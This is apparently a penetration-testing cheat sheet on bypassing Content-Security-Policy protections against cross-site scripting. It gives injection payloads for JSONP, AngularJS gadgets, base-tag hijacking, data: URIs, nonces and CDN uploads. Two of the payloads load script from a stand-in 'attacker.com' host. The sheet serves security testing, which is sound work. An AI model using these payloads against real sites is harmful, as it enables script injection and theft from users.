# CSP (Content Security Policy) Bypass

## Overview
Techniques to bypass Content-Security-Policy headers that are intended to prevent XSS and data injection attacks.

## Analyzing CSP
```
# Read CSP from response headers:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.target.com; ...

# Or from meta tag:
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

# Evaluate with: https://csp-evaluator.withgoogle.com
```

## Wildcard / Overly Permissive Directives
```
# Wildcard source
script-src *          → can load script from anywhere
script-src https:     → any HTTPS source
script-src http:      → any HTTP source

# Missing directives fall back to default-src
# If object-src not set → falls back to default-src

# 'unsafe-inline' present → direct inline XSS works
# 'unsafe-eval' present → eval() / setTimeout("string") works
```

## JSONP Bypass
```
# If trusted domain has JSONP endpoint:
Content-Security-Policy: script-src https://trusted.com

# JSONP endpoint: https://trusted.com/api?callback=alert(1)
# Inject: <script src="https://trusted.com/api?callback=alert(1)//"></script>
```

## Angular / Framework Bypass
```
# If Angular/Vue/React allowed in script-src:
# Angular template injection
{{constructor.constructor('alert(1)')()}}
<div ng-app ng-csp ng-click="$event.view.alert(1)">click</div>

# Angular CDN
script-src ajax.googleapis.com → AngularJS gadget works
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

## base-uri Bypass
```
# If base-uri not set or 'unsafe' → can inject <base> tag
# Change base URL to redirect all relative URLs
<base href="https://attacker.com/">
# Then: <script src="/evil.js"> → loads from attacker.com
```

## data: URI Bypass
```
# If data: allowed in script-src or default-src
script-src data:
<script src="data:text/javascript,alert(1)"></script>
```

## Nonce Bypass
```
# Nonce should be random per request
# If nonce is predictable/reused → bypass

# If nonce reflected in page from user input:
# Inject: <script nonce="LEAKED_NONCE">alert(1)</script>

# If nonce in URL (e.g., via meta refresh):
# Steal via cache or timing
```

## Hash-Based CSP
```
# 'sha256-<hash>' allows specific scripts
# If hash covers dynamic content → may be exploitable

# Test: change whitelisted script content slightly
# If hash validation weak → bypass
```

## script-src 'strict-dynamic'
```
# 'strict-dynamic' trusts scripts loaded by trusted scripts
# If trusted script loads user-controlled URL → bypass
<script nonce="abc">document.write('<script src="'+location.hash.slice(1)+'"><\/script>')</script>
# Visit: /page#https://attacker.com/evil.js
```

## iframe sandbox Bypass
```
# sandbox attribute on iframe restricts CSP scope
# If allow-scripts present in sandbox → scripts run
# parent CSP may not apply inside sandboxed iframe
```

## Object/Embed Bypass
```
# If object-src not restricted:
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

## CDN Whitelist Abuse
```
# Many CDNs host user-uploaded content
# If CDN domain is whitelisted, check for upload functionality

# Common CDN paths that allow user content:
# storage.googleapis.com → upload to Google Cloud Storage
# s3.amazonaws.com → upload to S3
# raw.githubusercontent.com → GitHub raw content
# ajax.cloudflare.com → workers

# Upload malicious JS → use CDN URL in injection
```

## Path Restrictions Bypass
```
# CSP: script-src https://cdn.target.com/js/
# Try path traversal: https://cdn.target.com/js/../uploads/evil.js
# Or: https://cdn.target.com/js/../../uploads/evil.js
```

## Testing Methodology
1. Find CSP header or meta tag
2. Analyze with csp-evaluator.withgoogle.com
3. Check for: wildcard, unsafe-inline, unsafe-eval, data:, JSONP endpoints
4. Check whitelisted domains for JSONP, user-uploaded content, open redirects
5. Check if base-uri is set
6. Test framework-specific bypasses if Angular/etc. CDN whitelisted
7. Check nonce/hash implementation
8. Use Burp's CSP auditor extension

## Tools
- CSP Evaluator (Google)
- Burp Suite CSP Auditor extension
- `csp-bypass` lists on GitHub
